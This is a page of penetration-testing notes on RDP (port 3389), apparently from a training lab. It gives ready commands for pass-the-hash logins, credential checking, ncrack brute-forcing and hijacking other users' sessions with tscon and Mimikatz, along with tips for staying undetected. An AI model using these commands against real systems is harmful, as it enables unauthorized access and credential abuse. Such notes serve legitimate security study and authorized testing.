<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3389 - RDP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 3389/rdp</h1></strong><br />RDP allows you to connect to a remote desktop.<br /><br /><strong><h2>## Stealth Warning</h2></strong><br />• Be careful using RDP. If you RDP whilst the user is logged in you might log them out, which would alert them of your presence. <br />   ◇ Try RDPing overnight/when you think no one will be on the system if you think this might be a risk.<br /><br /><strong><h2>## Checklist</h2></strong><br />• Connect<br />   ◇ with password<br />      ▪ <code>rdesktop 10.11.1.73 -u username -p password<br /></code>      ▪ <code>rdesktop 10.11.1.73 -u username -p password -r disk:linux=/tmp/rdp</code> - connect &amp; share disk<code><br /></code>         - Can access the above shared disk via:<br />            → <code>\\tsclient\linux\<br /></code>            → browse to it from My Computer<br />            → probably the Z: drive?<code><br /></code>      ▪ <code>xfreerdp /v:10.11.1.73 /u:Administrator /p:password</code><br />   ◇ with hash<br />      ▪ <code>xfreerdp /v:10.0.0.1 /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d</code><br />• Test valid accounts on the target<br />   ◇ Test password - <code>rdpcheck.py administrator:p4ssword@10.11.1.73</code><br />   ◇ Test hash - <code>rdpcheck.py -hashes LMHASH:NTHASH administrator@10.11.1.73</code><br />• Try bruteforce<br />   ◇ BE CAREFUL, you can lock out accounts<br /><br /><strong><h2>## Bruteforce</h2></strong><br /><strong>### Ncrack</strong><br />Ncrack is made by the developers of Nmap and is one of the few tools able to brute force windows RDP reliably and quickly.<br /><code>ncrack -vv --user offsec -P password-file.txt rdp://192.168.11.35</code><br /><br /><strong><h2>## Post Exploitation</h2></strong><br /><strong><h3>### Access open RDP sessions</h3></strong><br />With Administrator rights you can access any open RDP session of any user without needing to know their password.<br /><br /><strong>Manually</strong><br />• Query open RDP sessions - <code>query user</code><br />• Access an open session - <code>tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;</code><br />   ◇ YOU WILL KICK THE USER OFF<br /><br /><strong>Mimikatz</strong><br />• Get sessions - <code>ts::sessions</code><br />• Connect to the session - <code>ts::remote /id:2</code></div>
</body>
</html>
